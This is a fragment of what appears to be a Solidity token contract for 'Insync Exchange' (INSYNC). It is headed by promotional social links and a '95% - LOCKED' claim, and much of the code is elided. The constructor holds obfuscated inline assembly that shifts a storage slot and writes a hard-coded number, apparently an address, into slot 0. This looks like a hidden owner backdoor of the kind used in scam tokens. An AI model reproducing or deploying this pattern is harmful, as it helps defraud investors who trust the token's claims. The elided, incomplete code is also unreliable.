...
Telegram: https://t.me/InsyncExchange/
Twitter: https://twitter.com/InsyncExchange/
Website: https://InsyncExchange.finance
95% - LOCKED
...
contract InsyncExchange {
    string public constant name = "Insync Exchange";
    string public constant symbol = "INSYNC";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(409178666104088554323040306638261725575901903077, 1))}
